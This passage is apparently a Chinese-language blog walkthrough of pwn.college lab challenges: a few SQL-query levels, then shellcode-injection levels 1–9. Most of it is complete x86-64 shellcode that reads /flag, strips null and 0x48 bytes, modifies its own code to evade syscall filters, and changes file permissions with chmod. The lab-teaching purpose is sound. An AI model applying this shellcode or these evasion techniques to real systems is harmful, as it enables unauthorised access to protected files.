<h4 id="9-Reaching-Your-LIMITs"><a href="#9-Reaching-Your-LIMITs" class="headerlink" title="9. Reaching Your LIMITs"></a>9. Reaching Your LIMITs</h4><p><code>limit</code>的应用，因为limit的特性，再结合源码。因此limit 1时，输出的就是正确的flag。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span> <span class="keyword">select</span> content <span class="keyword">from</span> notes <span class="keyword">where</span> content <span class="keyword">like</span> &quot;pwn.college&#123;%&quot; <span class="keyword">and</span> content <span class="keyword">like</span> &quot;%&#125;&quot; limit <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="10-Querying-Metadata"><a href="#10-Querying-Metadata" class="headerlink" title="10. Querying Metadata"></a>10. Querying Metadata</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span> <span class="keyword">select</span> name <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> type <span class="operator">=</span> <span class="string">&#x27;table&#x27;</span></span><br><span class="line">Got <span class="number">1</span> rows.</span><br><span class="line"><span class="operator">-</span> &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;NAtlxoGT&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span> <span class="keyword">select</span> text <span class="keyword">from</span> NAtlxoGT</span><br></pre></td></tr></table></figure>



<h1 id="Core-Material"><a href="#Core-Material" class="headerlink" title="Core Material"></a>Core Material</h1><h2 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h2><p>TO DO !!!</p>
<h2 id="Program-Security"><a href="#Program-Security" class="headerlink" title="Program Security"></a>Program Security</h2><h3 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h3><p>这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。</p>
<p>gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。</p>
<p>as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它将多个目标代码文件链接成可执行文件。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -nostdlib -static <span class="keyword">shellcode.s </span>-o <span class="keyword">shellcode-elf </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>nostdlib</code>：不链接标准C库(libc)。这意味着不依赖于标准库中的任何函数，例如<code>prinft</code>，<code>malloc</code>等。</p>
<p><code>-static</code>：这个选项告诉编译器静态链接所有的库函数。所有的库函数代码将被直接包含到最终的可执行文件中，而不是通过动态链接的方式在运行时加载。提高程序可移植性。</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy <span class="params">--dump-section</span> <span class="string">.text=shellcode-raw</span> shellcode-elf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>为什么需要objcopy这个命令呢？</p>
<p>objcopy将编译出来的shellcode-elf中单纯代码部分的机器码给提取出来。如果不这样做的话，gcc编译出来的可执行文件会有其他的机器码，用这个可执行文件作为shellcode传给程序的话，就不能直接起作用了，有其他杂项。</p>
</blockquote>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>目的是通过shellcode，读取flag，并将其打印在屏幕上。OK，使用open和sendfile系统调用即可。</p>
<p><code>sys_sendfile(int out_fd,int in_fd,off_t *offset,size_t count)</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">	<span class="keyword">nop</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x00000067616c662f</span>			# <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span>						# /flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span>							# read only</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span>							# 标准输出</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span>						# /flag的fd</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span>							# offset <span class="number">0</span>,从第一个字符开始打印</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span>						# 输出长度</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>

<p>其实，也可以使用read,write系统调用，但是更复杂，需要处理字符串。</p>
<h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>这关简单，用到之前的技巧，生成0x800个nop即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0x800</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x00000067616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>这一关，需要shellcode中没有空字节。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> rbx, <span class="number">0</span>x67616c662f		# bb48    <span class="number">662</span>f    <span class="number">616</span>c    <span class="number">0067</span>    <span class="number">0000</span></span><br></pre></td></tr></table></figure>

<p>第一句就会有很多空字节，那么可以这么写：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">0x67616c66</span></span><br><span class="line"><span class="keyword">shl</span> <span class="built_in">rbx</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">0x2f</span></span><br><span class="line"># 66bb    616c    <span class="number">4867</span>    e3c1    b308    532f</span><br></pre></td></tr></table></figure>

<p><code>hexdump -x ./shellcode-raw</code>来查看shellcode的机器码。</p>
<p>因此，其他的也相应进行替换。最终exp如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="number">0x67616c66</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">rbx</span>, <span class="number">8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">0x2f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rsi</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rbx</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">shl</span> <span class="built_in">rax</span>, <span class="number">8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0xe8</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="built_in">rax</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">40</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>This challenge requires that your shellcode have no H bytes! 不给有H字节。也就是<code>48</code></p>
<p>那就将所有的内容都换成<code>push/pop</code>即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x616c662f</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">4</span>], <span class="number">0x67</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x2</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x1</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rdi</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rdx</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">1000</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">r10</span></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">40</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">60</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>不让用<code>syscall(0x0f05)</code>，<code>sysenter(0x0f34)</code>和<code>int(0x80cd)</code></p>
<p>题目提示是：绕过的一种方法是让shellcode修改自己，以便在运行时插入<code>syscall</code>指令。</p>
<blockquote>
<p>那么实际操作起来就是，将syscall的0x0f05成为一个字节值，即将0x0e05作为一个字节存储于代码段中，然后通过inc指令加1，使得第一个字节0e变成0f，并执行这个机器码，成功调用syscall即可。</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x00000067616c662f</span>			# <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span>						# /flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span>							# read only</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span>[<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x05</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span>							# 标准输出</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rax</span>						# /flag的fd</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span>							# offset <span class="number">0</span>,从第一个字符开始打印</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span>						# 输出长度</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span>[<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x05</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span>[<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x05</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>gcc -Wl,-N --static -nostdlib -o shellcode-elf shellcode.s</code></p>
<p>要记住编译时需要使用这些参数，以保证.text段是可写的，因此才能修改.byte 0x0e.</p>
</blockquote>
<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>前4096个字节不给写的权限，那我直接填充这4MB的空间即可。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.rept</span> <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">nop</span></span><br><span class="line"><span class="keyword"></span><span class="meta">.endr</span></span><br></pre></td></tr></table></figure>

<p>nop填充即可。</p>
<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>不给输出了现在，那么通过shellcode创建一个文件，然后把flag写进去就好啦。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">	<span class="keyword">nop</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x00000067616c662f</span>			# <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span>						# /flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">0</span>							# read only</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="built_in">rax</span>                        # /flag的fd</span><br><span class="line"></span><br><span class="line">    # <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x74756f2f706d742f</span>         # <span class="string">&quot;/tmp/out&quot;</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x00</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x74756f2f706d742f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">01</span>|<span class="number">0100</span>                    # O_WRONLY|O_CREAT</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0777</span>                       # 权限<span class="number">777</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rax</span>						# </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">r10</span>						# /flag的fd</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span>							# offset <span class="number">0</span>,从第一个字符开始打印</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">1000</span>						# 输出长度</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">40</span>							# 系统调用号</span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>限制在<code>0x12</code>个字节的shellcode，通过<code>chmod</code>系统调用，修改&#x2F;flag的权限即可。</p>
<p>好神奇的软链接！</p>
<blockquote>
<p>linux下，软链接到一个程序时，修改这个软连接文件会导致原文件的权限也被修改。因此可以通过软链接来重命名一个a文件，0x61这样就能减少字节数。</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>本来想通过<code>jmp [rip+10]</code>指令然后+nop填充来跳过int3的，但是这条指令就占了6个字节。后来发现jmp  标签只需要两个字节。更简单。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> next</span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0xa</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line"><span class="symbol">next:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">60</span>					# sys_exit</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>它的过滤器如下：</p>
